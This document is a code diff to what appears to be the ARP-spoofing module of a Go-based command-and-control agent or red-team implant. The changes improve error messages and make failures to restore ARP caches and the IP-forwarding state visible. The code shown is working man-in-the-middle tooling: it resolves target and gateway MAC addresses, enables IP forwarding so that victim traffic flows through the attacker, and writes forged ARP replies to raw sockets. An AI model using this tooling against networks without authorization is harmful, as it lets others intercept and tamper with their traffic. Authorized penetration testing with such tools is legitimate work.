@@ -22,17 +22,17 @@ import (
 func executeArpSpoof(task structs.Task) structs.CommandResult {
 	args, err := parseArpSpoofArgs(task.Params)
 	if err != nil {
-		return errorf("Error: %v", err)
+		return errorf("failed to parse ARP spoof arguments: %v", err)
 	}
 
 	// Resolve target and gateway MAC addresses
 	targetMAC, err := resolveMAC(args.Target)
 	if err != nil {
-		return errorf("Error resolving target MAC: %v", err)
+		return errorf("resolving target MAC: %v", err)
 	}
 	gatewayMAC, err := resolveMAC(args.Gateway)
 	if err != nil {
-		return errorf("Error resolving gateway MAC: %v", err)
+		return errorf("resolving gateway MAC: %v", err)
 	}
 
 	// Get attacker's interface and MAC
@@ -40,25 +40,25 @@ func executeArpSpoof(task structs.Task) structs.CommandResult {
 	if ifaceName == "" {
 		ifaceName, err = getDefaultInterface()
 		if err != nil {
-			return errorf("Error detecting interface: %v", err)
+			return errorf("detecting interface: %v", err)
 		}
 	}
 	iface, err := net.InterfaceByName(ifaceName)
 	if err != nil {
-		return errorf("Error: interface %s: %v", ifaceName, err)
+		return errorf("interface %s: %v", ifaceName, err)
 	}
 	attackerMAC := iface.HardwareAddr
 
 	// Enable IP forwarding so traffic flows through us
 	prevForward, err := enableIPForwarding()
 	if err != nil {
-		return errorf("Error enabling IP forwarding: %v", err)
+		return errorf("enabling IP forwarding: %v", err)
 	}
 
 	// Open raw socket for sending ARP frames
 	fd, err := syscall.Socket(syscall.AF_PACKET, syscall.SOCK_RAW, int(htons(etherTypeARP)))
 	if err != nil {
-		return errorf("Error opening raw socket: %v (requires root)", err)
+		return errorf("opening raw socket: %v (requires root)", err)
 	}
 	defer syscall.Close(fd)
 
@@ -124,19 +124,31 @@ cleanup:
 	restoreToTarget := buildARPReply(targetMAC, gatewayMAC, gatewayIP, targetIP)
 	restoreToGateway := buildARPReply(gatewayMAC, targetMAC, targetIP, gatewayIP)
 
+	restoreFailed := false
 	for i := 0; i < 3; i++ {
-		_ = syscall.Sendto(fd, restoreToTarget, 0, &addr)
-		_ = syscall.Sendto(fd, restoreToGateway, 0, &addr)
+		if err := syscall.Sendto(fd, restoreToTarget, 0, &addr); err != nil {
+			restoreFailed = true
+		}
+		if err := syscall.Sendto(fd, restoreToGateway, 0, &addr); err != nil {
+			restoreFailed = true
+		}
 		time.Sleep(500 * time.Millisecond)
 	}
-	result.Restored = true
+	result.Restored = !restoreFailed
+	if restoreFailed {
+		result.Warnings = append(result.Warnings, "ARP restore packets failed to send — target ARP cache may not be cleaned up")
+	}
 
-	// Restore original IP forwarding state
-	restoreIPForwarding(prevForward)
+	if fwdErr := restoreIPForwarding(prevForward); fwdErr != nil {
+		result.Warnings = append(result.Warnings, fmt.Sprintf("failed to restore ip_forward: %v", fwdErr))
+	}
 
 	result.Duration = fmt.Sprintf("%ds", args.Duration)
 
-	output, _ := json.Marshal(result)
+	output, err := json.Marshal(result)
+	if err != nil {
+		return errorf("failed to marshal result: %v", err)
+	}
 	return successResult(string(output))
 }
 
@@ -183,11 +195,11 @@ func enableIPForwarding() (string, error) {
 	return string(prev), nil
 }
 
-// restoreIPForwarding restores the previous IP forwarding state.
-func restoreIPForwarding(prev string) {
-	if prev != "" {
-		_ = os.WriteFile("/proc/sys/net/ipv4/ip_forward", []byte(prev), 0644)
+func restoreIPForwarding(prev string) error {
+	if prev == "" {
+		return nil
 	}
+	return os.WriteFile("/proc/sys/net/ipv4/ip_forward", []byte(prev), 0644)
 }
 
 // htons converts a uint16 from host to network byte order.
